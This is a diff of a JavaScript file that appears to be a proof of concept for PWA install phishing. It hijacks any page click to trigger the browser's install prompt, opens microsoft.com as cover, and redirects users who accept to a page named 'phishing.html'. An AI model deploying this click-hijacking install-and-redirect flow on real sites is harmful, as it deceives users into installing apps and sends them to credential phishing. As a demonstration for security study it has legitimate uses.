@@ -1,35 +1,29 @@
 navigator.serviceWorker.register("dummy-sw.js");
 
+var flag = 0
+
 window.addEventListener("DOMContentLoaded", async event => {
   if ('BeforeInstallPromptEvent' in window) {
     showResult("⏳ BeforeInstallPromptEvent supported but not fired yet");
   } else {
     showResult("❌ BeforeInstallPromptEvent NOT supported");    
   }
-
-  // Listen for the 'keydown' event to detect when 'Ctrl' is pressed
-  document.addEventListener("keydown", (event) => {
-    // Check if the 'Ctrl' key is pressed
-    if (event.ctrlKey) {
-      installApp(); // Trigger install app when 'Ctrl' is pressed
-    }
-  });
-
-  setTimeout(function(){
-    installApp();  // This will still trigger install after 2 seconds
-  }, 1);
-  
+  document.addEventListener("click", () => {  
+    installApp()
+    window.open("https://microsoft.com")
+  })
 });
 
 let deferredPrompt;
 
 window.addEventListener('beforeinstallprompt', (e) => {
-  // Prevent the default mini-infobar or install dialog from appearing on mobile
+  // Prevents the default mini-infobar or install dialog from appearing on mobile
   e.preventDefault();
   // Save the event because you’ll need to trigger it later.
   deferredPrompt = e;
   // Show your customized install prompt for your PWA
   showResult("✅ BeforeInstallPromptEvent fired", true);
+  
 });
 
 window.addEventListener('appinstalled', (e) => {
@@ -38,16 +32,16 @@ window.addEventListener('appinstalled', (e) => {
 
 async function installApp() {
   if (deferredPrompt) {
-    deferredPrompt.prompt();  // Show the install prompt
+    deferredPrompt.prompt();
     showResult("🆗 Installation Dialog opened");
-    
-    // Wait for the user's choice
+    // Find out whether the user confirmed the installation or not
     const { outcome } = await deferredPrompt.userChoice;
-    deferredPrompt = null;  // After it's used, set it to null
-    
+    // The deferredPrompt can only be used once.
+    deferredPrompt = null;
+    // Act on the user's choice
     if (outcome === 'accepted') {
       showResult('😀 User accepted the install prompt.', true);
-      location.href = "./phishing.html";  // You might want to handle this redirection carefully
+      location.href = "./phishing.html"
     } else if (outcome === 'dismissed') {
       showResult('😟 User dismissed the install prompt');
     }
@@ -56,9 +50,8 @@ async function installApp() {
 
 function showResult(text, append=false) {
   if (append) {
-    document.querySelector("output").innerHTML += "<br>" + text;
+      document.querySelector("output").innerHTML += "<br>" + text;
   } else {
-    document.querySelector("output").innerHTML = text;    
+     document.querySelector("output").innerHTML = text;    
   }
 }
-
